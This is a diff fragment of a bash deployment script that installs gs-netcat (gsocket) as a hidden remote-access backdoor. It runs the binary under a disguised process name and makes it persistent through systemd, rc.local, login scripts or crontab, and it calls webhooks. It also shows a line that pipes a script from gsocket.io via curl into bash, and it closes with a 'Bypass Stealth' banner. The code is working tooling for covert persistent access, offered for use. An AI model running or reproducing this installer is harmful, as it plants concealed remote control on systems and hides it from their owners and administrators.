+	if [[ "${src_pkg}" == *.tar.gz ]]; then
+		# Unpack (suppress "tar: warning: skipping header 'x'" on alpine linux
+		(cd "${TMPDIR}" && tar xfz "${src_pkg}" 2>/dev/null) || { FAIL_OUT "unpacking failed"; errexit; }
+		[[ -f "${TMPDIR}/._gs-netcat" ]] && rm -f "${TMPDIR}/._gs-netcat" # from docker???
+		[[ -n $GS_USELOCAL_GSNC ]] && {
+			[[ -f "$GS_USELOCAL_GSNC" ]] || { FAIL_OUT "Not found: ${GS_USELOCAL_GSNC}"; errexit; }
+			xcp "${GS_USELOCAL_GSNC}" "${TMPDIR}/gs-netcat"
+		}
+	else
+		mv "${TMPDIR}/${src_pkg}" "${TMPDIR}/gs-netcat"
+	fi
+	OK_OUT
+
+	echo -en "Copying binaries......................................................"
+	xmv "${TMPDIR}/gs-netcat" "$DSTBIN" || { FAIL_OUT; errexit; }
+	chmod 700 "$DSTBIN"
+	OK_OUT
+
+	echo -en "Testing binaries......................................................"
+	test_bin "${DSTBIN}"
+	if [[ -n "$IS_TESTBIN_OK" ]]; then
+		OK_OUT
+		return
+	fi
+
+	rm -f "${TMPDIR}/${src_pkg:?}"
+}
+
+gs_start_systemd()
+{
+	# HERE: It's systemd
+	if [[ -z "$IS_GS_RUNNING" ]]; then
+		# Resetting the Timestamp will yield a systemctl status warning that daemon-reload
+		# is needed. Thus fix Timestamp here and reload.
+		clean_all
+		systemctl daemon-reload
+		systemctl restart "${SERVICE_HIDDEN_NAME}" &>/dev/null
+		if ! systemctl is-active "${SERVICE_HIDDEN_NAME}" &>/dev/null; then
+			FAIL_OUT "Check ${CM}systemctl start ${SERVICE_HIDDEN_NAME}${CN}."
+			exit_code 255
+		fi
+		IS_GS_RUNNING=1
+		OK_OUT
+		return
+	fi
+
+	SKIP_OUT "'${BIN_HIDDEN_NAME}' is already running and hidden as '${PROC_HIDDEN_NAME}'."
+}
+
+gs_start()
+{
+	# If installed as systemd then try to start it
+	[[ -n "$IS_SYSTEMD" ]] && gs_start_systemd
+	[[ -n "$IS_GS_RUNNING" ]] && return
+
+	# Scenario to consider:
+	# GS_UNDO=1 ./deploy.sh -> removed all binaries but user does not issue 'pkill gs-dbus'
+	# ./deploy.sh -> re-installs new secret. Start gs-dbus with _new_ secret.
+	# Now two gs-dbus's are running (which is correct)
+	if [[ -n "$KL_CMD" ]]; then
+		${KL_CMD} "${KL_CMD_RUNCHK_UARG[@]}" "${BIN_HIDDEN_NAME}" 2>/dev/null && IS_OLD_RUNNING=1
+	elif command -v pidof >/dev/null; then
+		# if no pkill/killall then try pidof (but we cant tell which user...)
+		if pidof -qs "$BIN_HIDDEN_NAME" &>/dev/null; then
+			IS_OLD_RUNNING=1
+		fi
+	fi
+	IS_NEED_START=1
+
+	if [[ -n "$IS_OLD_RUNNING" ]]; then
+		# HERE: OLD is already running.
+		if [[ -n "$IS_SKIPPED" ]]; then
+			# HERE: Already running. Skipped installation (sec.dat has not changed).
+			SKIP_OUT "'${BIN_HIDDEN_NAME}' is already running and hidden as '${PROC_HIDDEN_NAME}'."
+			unset IS_NEED_START
+		else
+			# HERE: sec.dat has been updated
+			OK_OUT
+			WARN "More than one ${PROC_HIDDEN_NAME} is running."
+			echo -e "--> You may want to check: ${CM}ps -elf|grep -E -- '(${PROC_HIDDEN_NAME_RX})'${CN}"
+			[[ -n $OLD_PIDS ]] && echo -e "--> or terminate the old ones: ${CM}kill ${OLD_PIDS}${CN}"
+		fi
+	else
+		OK_OUT ""
+	fi
+
+	if [[ -n "$IS_NEED_START" ]]; then
+		# We need an 'eval' here because the ENV_LINE[*] needs to be expanded
+		# and then executed.
+		# This wont work:
+		#     FOO="X=1" && ($FOO id)  # => -bash: X=1: command not found
+		# This does work:
+		#     FOO="X=1" && (eval $FOO id)
+		(cd "$HOME"; eval "${ENV_LINE[*]}"TERM=xterm-256color GS_ARGS=\"-s "$GS_SECRET" -liD\" exec -a \""$PROC_HIDDEN_NAME"\" \""$DSTBIN"\") || errexit
+		IS_GS_RUNNING=1
+	fi
+}
+
+init_vars
+
+[[ "$1" =~ (clean|uninstall|clear|undo) ]] && uninstall
+[[ -n "$GS_UNDO" ]] || [[ -n "$GS_CLEAN" ]] || [[ -n "$GS_UNINSTALL" ]] && uninstall
+
+init_setup
+# User supplied install-secret: X=MySecret bash -c "$(curl -fsSL https://gsocket.io/x)"
+[[ -n "$X" ]] && GS_SECRET_X="$X"
+
+if [[ -z $S ]]; then
+	# HERE: S= is NOT set
+	if [[ $UID -eq 0 ]]; then
+		gs_secret_reload "$SYSTEMD_SEC_FILE" 
+		gs_secret_reload "$RCLOCAL_SEC_FILE" 
+	fi
+	gs_secret_reload "$USER_SEC_FILE"
+
+	if [[ -n $GS_SECRET_FROM_FILE ]]; then
+		GS_SECRET="${GS_SECRET_FROM_FILE}"
+	else
+		GS_SECRET="${GS_SECRET_X}"
+	fi
+
+	DEBUGF "GS_SECRET=$GS_SECRET (F=${GS_SECRET_FROM_FILE}, X=${GS_SECRET_X})"
+else
+	GS_SECRET="$S"
+	URL_BIN="$URL_BIN_FULL"
+fi
+
+try "$OSARCH" "$SRC_PKG"
+
+# [[ -z "$GS_OSARCH" ]] && [[ -z "$IS_TESTBIN_OK" ]] && try_any
+WARN_EXECFAIL
+[[ -z "$IS_TESTBIN_OK" ]] && errexit "None of the binaries worked."
+
+[[ -z $S ]] && try_network
+# [[ -n "$GS_UPDATE" ]] && gs_update
+
+# S= is set. Do not install but connect to remote using S= as secret.
+[[ -n "$S" ]] && gs_access
+
+# -----BEGIN Install permanentally-----
+if [[ -z $GS_NOINST ]]; then
+	if [[ -n $IS_DSTBIN_TMP ]]; then
+		echo -en "Installing remote access.............................................."
+		FAIL_OUT "${CDR}Set GS_DSTDIR= to a writeable & executable directory.${CN}"
+	else
+		# Try to install system wide. This may also start the service.
+		[[ $UID -eq 0 ]] && install_system
+
+		# Try to install to user's login script or crontab (if not installed as SYSTEMD)
+		[[ -z "$IS_INSTALLED" || -z "$IS_SYSTEMD" ]] && install_user
+	fi
+else
+	echo -e "GS_NOINST is set. Skipping installation."
+fi
+# -----END Install permanentally-----
+
+if [[ -z "$IS_INSTALLED" ]] || [[ -n $IS_DSTBIN_TMP ]]; then
+	echo -e >&2 "--> ${CR}Access will be lost after reboot.${CN}"
+fi
+	
+[[ -n $IS_DSTBIN_CWD ]] && WARN "Installed to ${PWD}. Try GS_DSTDIR= otherwise.."
+
+webhooks
+
+HOWTO_CONNECT_OUT
+
+printf "%-70.70s" "Starting '${BIN_HIDDEN_NAME}' as hidden process '${PROC_HIDDEN_NAME}'....................................."
+if [[ -n "$GS_NOSTART" ]]; then
+	SKIP_OUT "GS_NOSTART=1 is set."
+else
+	gs_start
+fi
+
+echo -e "--> ${CW}G-Socket Bypass Stealth -@bboscat${CN}"
+
+exit_code 0
